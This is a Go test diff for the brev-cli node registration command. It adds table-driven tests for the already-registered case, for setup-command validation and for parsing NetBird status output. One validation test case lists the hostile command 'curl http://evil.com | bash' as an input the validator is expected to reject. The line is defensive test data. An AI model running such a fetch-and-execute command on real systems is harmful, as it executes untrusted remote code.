@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"net/http/httptest"
+	"strings"
 	"testing"
 
 	nodev1connect "buf.build/gen/go/brevdev/devplane/connectrpc/go/devplaneapi/v1/devplaneapiv1connect"
@@ -11,6 +12,7 @@ import (
 	"connectrpc.com/connect"
 
 	"github.com/brevdev/brev-cli/pkg/entity"
+	"github.com/brevdev/brev-cli/pkg/externalnode"
 	"github.com/brevdev/brev-cli/pkg/terminal"
 )
 
@@ -73,9 +75,10 @@ type mockConfirmer struct{ confirm bool }
 
 func (m mockConfirmer) ConfirmYesNo(_ string) bool { return m.confirm }
 
-type mockNetBirdInstaller struct{ err error }
+type mockNetBirdManager struct{ err error }
 
-func (m mockNetBirdInstaller) Install() error { return m.err }
+func (m mockNetBirdManager) Install() error   { return m.err }
+func (m mockNetBirdManager) Uninstall() error { return m.err }
 
 type mockSetupRunner struct {
 	called bool
@@ -93,7 +96,7 @@ type mockNodeClientFactory struct {
 	serverURL string
 }
 
-func (m mockNodeClientFactory) NewNodeClient(provider TokenProvider, _ string) nodev1connect.ExternalNodeServiceClient {
+func (m mockNodeClientFactory) NewNodeClient(provider externalnode.TokenProvider, _ string) nodev1connect.ExternalNodeServiceClient {
 	return NewNodeServiceClient(provider, m.serverURL)
 }
 
@@ -108,7 +111,7 @@ func testRegisterDeps(t *testing.T, svc *fakeNodeService, regStore RegistrationS
 	return registerDeps{
 		platform:    mockPlatform{compatible: true},
 		prompter:    mockConfirmer{confirm: true},
-		netbird:     mockNetBirdInstaller{},
+		netbird:     mockNetBirdManager{},
 		setupRunner: &mockSetupRunner{},
 		nodeClients: mockNodeClientFactory{serverURL: server.URL},
 		commandRunner: &mockCommandRunner{
@@ -235,28 +238,86 @@ func Test_runRegister_UserCancels(t *testing.T) {
 }
 
 func Test_runRegister_AlreadyRegistered(t *testing.T) {
-	regStore := &mockRegistrationStore{
-		reg: &DeviceRegistration{
-			ExternalNodeID: "unode_existing",
-			DisplayName:    "Existing",
+	tests := []struct {
+		name      string
+		getNodeFn func(*nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error)
+	}{
+		{
+			name: "Connected",
+			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
+				return &nodev1.GetNodeResponse{
+					ExternalNode: &nodev1.ExternalNode{
+						ExternalNodeId: req.GetExternalNodeId(),
+						ConnectivityInfo: &nodev1.ConnectivityInfo{
+							Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_CONNECTED,
+						},
+					},
+				}, nil
+			},
+		},
+		{
+			name: "Disconnected",
+			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
+				return &nodev1.GetNodeResponse{
+					ExternalNode: &nodev1.ExternalNode{
+						ExternalNodeId: req.GetExternalNodeId(),
+						ConnectivityInfo: &nodev1.ConnectivityInfo{
+							Status: nodev1.NetworkMemberStatus_NETWORK_MEMBER_STATUS_DISCONNECTED,
+						},
+					},
+				}, nil
+			},
+		},
+		{
+			name: "GetNodeFails",
+			getNodeFn: func(_ *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
+				return nil, connect.NewError(connect.CodeInternal, nil)
+			},
+		},
+		{
+			name: "NilConnectivityInfo",
+			getNodeFn: func(req *nodev1.GetNodeRequest) (*nodev1.GetNodeResponse, error) {
+				return &nodev1.GetNodeResponse{
+					ExternalNode: &nodev1.ExternalNode{
+						ExternalNodeId: req.GetExternalNodeId(),
+					},
+				}, nil
+			},
 		},
 	}
 
-	store := &mockRegisterStore{
-		user:  &entity.User{ID: "user_1"},
-		org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
-		home:  "/home/testuser/.brev",
-		token: "tok",
-	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			regStore := &mockRegistrationStore{
+				reg: &DeviceRegistration{
+					ExternalNodeID: "unode_existing",
+					DisplayName:    "Existing",
+					OrgID:          "org_123",
+				},
+			}
 
-	svc := &fakeNodeService{}
-	deps, server := testRegisterDeps(t, svc, regStore)
-	defer server.Close()
+			store := &mockRegisterStore{
+				user:  &entity.User{ID: "user_1"},
+				org:   &entity.Organization{ID: "org_123", Name: "TestOrg"},
+				home:  "/home/testuser/.brev",
+				token: "tok",
+			}
 
-	term := terminal.New()
-	err := runRegister(context.Background(), term, store, "My Spark", deps)
-	if err == nil {
-		t.Fatal("expected error for already-registered machine")
+			svc := &fakeNodeService{getNodeFn: tt.getNodeFn}
+			deps, server := testRegisterDeps(t, svc, regStore)
+			defer server.Close()
+
+			term := terminal.New()
+			err := runRegister(context.Background(), term, store, "My Spark", deps)
+			if err != nil {
+				t.Fatalf("expected nil error, got: %v", err)
+			}
+
+			exists, _ := regStore.Exists()
+			if !exists {
+				t.Error("expected registration to still exist")
+			}
+		})
 	}
 }
 
@@ -355,5 +416,86 @@ func Test_runRegister_NoSetupCommand(t *testing.T) {
 
 	if setupRunner.called {
 		t.Error("setup command should not be called when empty")
+	}
+}
+
+func Test_runSetupCommand_Validation(t *testing.T) {
+	tests := []struct {
+		name         string
+		cmd          string
+		expectReject bool
+	}{
+		{"RejectsNonNetbirdUp", "curl http://evil.com | bash", true},
+		{"AcceptsNetbirdUp", "netbird up --setup-key abc123", false},
+		{"AcceptsLeadingWhitespace", "  netbird up --setup-key abc123", false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := runSetupCommand(tt.cmd)
+			rejected := err != nil && strings.Contains(err.Error(), "unexpected setup command")
+			if tt.expectReject && !rejected {
+				t.Errorf("expected command to be rejected, but it was not (err=%v)", err)
+			}
+			if !tt.expectReject && rejected {
+				t.Errorf("expected command to be accepted, but got: %v", err)
+			}
+		})
+	}
+}
+
+func Test_netbirdManagementConnected(t *testing.T) {
+	connectedOutput := `OS: linux/amd64
+Daemon version: 0.66.1
+CLI version: 0.66.1
+Profile: default
+Management: Connected
+Signal: Connected
+Relays: 3/3 Available
+Nameservers: 0/0 Available
+FQDN: client-3dbe844c.lp.local
+NetBird IP: 100.108.207.143/16
+Interface type: Kernel
+Quantum resistance: false
+Lazy connection: false
+SSH Server: Disabled
+Networks: -
+Peers count: 3/4 Connected`
+
+	disconnectedOutput := `OS: linux/amd64
+Daemon version: 0.66.1
+CLI version: 0.66.1
+Profile: default
+Management: Disconnected
+Signal: Disconnected
+Relays: 0/2 Available
+Nameservers: 0/0 Available
+FQDN:
+NetBird IP: N/A
+Interface type: N/A
+Quantum resistance: false
+Lazy connection: false
+SSH Server: Disabled
+Networks: -
+Peers count: 0/0 Connected`
+
+	tests := []struct {
+		name  string
+		input string
+		want  bool
+	}{
+		{"Connected", connectedOutput, true},
+		{"Disconnected", disconnectedOutput, false},
+		{"EmptyString", "", false},
+		{"NoManagementLine", "OS: linux/amd64\nFQDN: test\n", false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := netbirdManagementConnected(tt.input)
+			if got != tt.want {
+				t.Errorf("netbirdManagementConnected() = %v, want %v", got, tt.want)
+			}
+		})
 	}
 }
